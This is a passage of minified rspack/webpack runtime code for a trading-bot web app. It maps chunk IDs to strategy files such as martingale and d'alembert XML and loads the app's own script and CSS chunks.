    }, n.hmd = function(e) {
        return !(e = Object.create(e)).children && (e.children = []), Object.defineProperty(e, "exports", {
            enumerable: !0,
            set: function() {
                throw Error("ES Modules may not assign module.exports or exports.*, Use ESM export syntax, instead: " + e.id)
            }
        }), e
    }, n.u = function(e) {
        return "static/js/async/" + (({
            110: "accumulators_dalembert_on_stat_reset-xml",
            281: "1_3_2_6-xml",
            329: "accumulators_martingale_on_stat_reset-xml",
            369: "oscars_grind_max-stake-xml",
            451: "dalembert-xml",
            535: "accumulators_reverse_dalembert_on_stat_reset-xml",
            59: "martingale-xml",
            600: "dalembert_max-stake-xml",
            642: "oscars_grind-xml",
            723: "martingale_max-stake-xml",
            730: "accumulators_reverse_dalembert-xml",
            777: "accumulators_reverse_martingale-xml",
            809: "reverse_dalembert-xml",
            822: "reverse_martingale-xml",
            867: "dbot-collection",
            881: "accumulators_reverse_martingale_on_stat_reset-xml",
            917: "accumulators_martingale-xml",
            980: "accumulators_dalembert-xml"
        })[e] || e) + "." + ({
            110: "f9070507",
            165: "c25945a3",
            176: "845571b6",
            281: "bc09d0b8",
            31: "6f91a1a3",
            329: "1e5c6fa6",
            369: "cfe4c853",
            451: "a87b54b9",
            463: "a6ac82a9",
            535: "c96c7669",
            546: "2193127c",
            551: "07445070",
            59: "ef17bdde",
            600: "cd16a357",
            602: "deccc6e5",
            609: "1f4404e7",
            642: "92cb2a86",
            648: "b517c209",
            673: "6d3dbcf9",
            702: "a15ca431",
            723: "61c0848d",
            730: "c6c62f9b",
            753: "a367dc50",
            762: "4f9bfcbb",
            777: "5de28a8c",
            799: "44932fcc",
            809: "faf6f5cc",
            822: "9b7a8cfe",
            867: "1d13cb2c",
            871: "44349898",
            881: "cf5666b3",
            892: "4be81b10",
            917: "12922288",
            932: "e88dea47",
            980: "1f1ed9fd",
            987: "7da608cd"
        })[e] + ".js"
    }, n.miniCssF = function(e) {
        return "static/css/async/" + e + "." + ({
            176: "a1f0e185",
            31: "03198a42",
            546: "81995dd0",
            648: "b6ca8bb3",
            702: "25cd83d7",
            871: "1ad49b2c",
            932: "34672c4b",
            987: "de041337"
        })[e] + ".css"
    }, n.h = function() {
        return "3d7ff8b7d6207874"
    }, n.g = function() {
        if ("object" == typeof globalThis) return globalThis;
        try {
            return this || Function("return this")()
        } catch (e) {
            if ("object" == typeof window) return window
        }
    }(), n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, (() => {
        var e = {},
            t = "bot:";
        n.l = function(a, i, l, o) {
            if (e[a]) {
                e[a].push(i);
                return
            }
            if (void 0 !== l) {
                for (var s, r, d = document.getElementsByTagName("script"), c = 0; c < d.length; c++) {
                    var u = d[c];
                    if (u.getAttribute("src") == a || u.getAttribute("data-webpack") == t + l) {
                        s = u;
                        break
                    }
                }
            }!s && (r = !0, (s = document.createElement("script")).charset = "utf-8", s.timeout = 120, n.nc && s.setAttribute("nonce", n.nc), s.setAttribute("data-webpack", t + l), s.src = a), e[a] = [i];
            var m = function(t, n) {
                    s.onerror = s.onload = null, clearTimeout(b);
                    var i = e[a];
                    if (delete e[a], s.parentNode && s.parentNode.removeChild(s), i && i.forEach(function(e) {
                            return e(n)
                        }), t) return t(n)
                },
                b = setTimeout(m.bind(null, void 0, {
                    type: "timeout",
                    target: s
                }), 12e4);
            s.onerror = m.bind(null, s.onerror), s.onload = m.bind(null, s.onload), r && document.head.appendChild(s)
        }
    })(), n.r = function(e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, n.nmd = function(e) {
        return e.paths = [], !e.children && (e.children = []), e
    }, (() => {
        var e = [];
        n.O = function(t, a, i, l) {
            if (a) {
                l = l || 0;
                for (var o = e.length; o > 0 && e[o - 1][2] > l; o--) e[o] = e[o - 1];
                e[o] = [a, i, l];
                return
            }
            for (var s = 1 / 0, o = 0; o < e.length; o++) {
                for (var a = e[o][0], i = e[o][1], l = e[o][2], r = !0, d = 0; d < a.length; d++)(!1 & l || s >= l) && Object.keys(n.O).every(function(e) {
                    return n.O[e](a[d])
                }) ? a.splice(d--, 1) : (r = !1, l < s && (s = l));
                if (r) {
                    e.splice(o--, 1);
                    var c = i();
                    void 0 !== c && (t = c)
                }
            }
            return t
        }
    })(), n.p = "/", n.rv = function() {
        return "1.0.14"
    }, (() => {
        if ("undefined" != typeof document) {
            var e = function(e, t, a, i, l) {
                    var o = document.createElement("link");
                    return o.rel = "stylesheet", o.type = "text/css", n.nc && (o.nonce = n.nc), o.onerror = o.onload = function(n) {
                        if (o.onerror = o.onload = null, "load" === n.type) i();
                        else {
                            var a = n && ("load" === n.type ? "missing" : n.type),
                                s = n && n.target && n.target.href || t,
                                r = Error("Loading CSS chunk " + e + " failed.\\n(" + s + ")");
                            r.code = "CSS_CHUNK_LOAD_FAILED", r.type = a, r.request = s, o.parentNode && o.parentNode.removeChild(o), l(r)
                        }
                    }, o.href = t, a ? a.parentNode.insertBefore(o, a.nextSibling) : document.head.appendChild(o), o
                },
                t = function(e, t) {
                    for (var n = document.getElementsByTagName("link"), a = 0; a < n.length; a++) {
                        var i = n[a],
                            l = i.getAttribute("data-href") || i.getAttribute("href");
                        if ("stylesheet" === i.rel && (l === e || l === t)) return i
                    }
                    for (var o = document.getElementsByTagName("style"), a = 0; a < o.length; a++) {
                        var i = o[a],
                            l = i.getAttribute("data-href");
                        if (l === e || l === t) return i
                    }
                },
                a = {
                    487: 0
                };
            n.f.miniCss = function(i, l) {
                if (a[i]) l.push(a[i]);
                else if (0 !== a[i] && ({
                        932: 1,
                        702: 1,
                        31: 1,
                        871: 1,
                        176: 1,
                        546: 1,
                        987: 1,
                        648: 1
                    })[i]) {
                    var o;
                    l.push(a[i] = (o = i, new Promise(function(a, i) {
                        var l = n.miniCssF(o),
                            s = n.p + l;
                        if (t(l, s)) return a();
                        e(o, s, null, a, i)
                    })).then(function() {
                        a[i] = 0
                    }, function(e) {
                        throw delete a[i], e
                    }))
                }
            }
        }
    })(), (() => {
        var e = {
            487: 0
        };
        n.f.j = function(t, a) {
            var i = n.o(e, t) ? e[t] : void 0;
            if (0 !== i) {
                if (i) a.push(i[2]);
                else {
                    var l = new Promise(function(n, a) {
                        i = e[t] = [n, a]
                    });
                    a.push(i[2] = l);
                    var o = n.p + n.u(t),
                        s = Error();
                    n.l(o, function(a) {
                        if (n.o(e, t) && (0 !== (i = e[t]) && (e[t] = void 0), i)) {
                            var l = a && ("load" === a.type ? "missing" : a.type),
                                o = a && a.target && a.target.src;
                            s.message = "Loading chunk " + t + " failed.\n(" + l + ": " + o + ")", s.name = "ChunkLoadError", s.type = l, s.request = o, i[1](s)
                        }
                    }, "chunk-" + t, t)
                }
            }
        }, n.O.j = function(t) {
            return 0 === e[t]
        };
        var t = function(t, a) {
                var i = a[0],
                    l = a[1],
                    o = a[2],
                    s, r, d = 0;
                if (i.some(function(t) {
                        return 0 !== e[t]
                    })) {
                    for (s in l) n.o(l, s) && (n.m[s] = l[s]);
                    if (o) var c = o(n)
                }
                for (t && t(a); d < i.length; d++) r = i[d], n.o(e, r) && e[r] && e[r][0](), e[r] = 0;
                return n.O(c)
            },
            a = self.webpackChunkbot = self.webpackChunkbot || [];
        a.forEach(t.bind(null, 0)), a.push = t.bind(null, a.push.bind(a))
    })(), n.ruid = "bundler=rspack@1.0.14";
    var a = n.O(void 0, ["361", "118", "721"], function() {
        return n("22187")
    });
    a = n.O(a)
})();